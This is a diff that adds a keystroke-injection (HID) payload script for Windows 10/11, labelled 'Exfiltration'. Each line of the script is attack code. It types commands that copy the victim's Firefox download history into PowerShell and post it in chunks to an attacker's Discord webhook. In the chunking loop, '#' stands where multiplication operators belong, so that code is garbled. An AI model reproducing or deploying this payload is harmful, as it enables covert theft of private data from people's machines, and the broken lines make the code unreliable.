@@ -1,0 +1,86 @@
+###########################################################
+#                                                         #
+# Title        : Exports all the links of the downloads   #
+# Author       : Aleff                                    #
+# Version      : 1.0                                      #
+# Category     : Exfiltration                             #
+# Target       : Windows 10/11                            #
+#                                                         #
+###########################################################
+
+ATTACKMODE HID
+
+# REQUIREMENTS
+#  - Firefox installed
+
+# VARIABLES
+# - You must define your Discord webhook if you want to use this method for the exfiltration
+DISCORD_WEBHOOK='example'
+
+# Open Firefox
+QUACK DELAY 1500
+QUACK GUI
+QUACK DELAY 1000
+QUACK STRING Firefox
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 2000
+
+# Goto downloads and copy all
+QUACK CTRL j
+QUACK DELAY 500
+QUACK CTRL a
+QUACK DELAY 500
+QUACK CTRL c
+QUACK DELAY 500
+
+# Open a PowerShell and put all the links into \$DOWNLOADS var
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING \$DOWNLOADS='
+QUACK CTRL v
+QUACK DELAY 500
+QUACK ENTER
+# It depends on the number of links
+QUACK DELAY 5000
+QUACK STRING '
+QUACK ENTER
+QUACK DELAY 500
+
+# Exfiltration using Discord Webhook
+QUACK STRING \$Payload = @{content = \$DOWNLOADS} | ConvertTo-Json
+QUACK ENTER
+QUACK DELAY 500
+# This algorithm is used to avoid the size limit imposed by Invoke-RestMethod on the payload length
+QUACK STRING \$len = \$DOWNLOADS.Length
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING \$MAX_LEN = 1900
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING \$ITERATIONS = [math]::Ceiling(\$len / \$MAX_LEN)
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING for (\$i = 0; \$i -lt \$ITERATIONS; \$i++) {
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING \$init = \$i # \$MAX_LEN
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING \$end = [math]::Min((\$i + 1) # \$MAX_LEN, \$len)
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING \$sub = \$DOWNLOADS.Substring(\$init, \$end - \$init)
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING \$Payload = @{content = \$sub} | ConvertTo-Json
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING Invoke-RestMethod -Uri '$DISCORD_WEBHOOK' -Method Post -Body \$Payload -ContentType 'application/json'
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING }; exit;
+QUACK ENTER
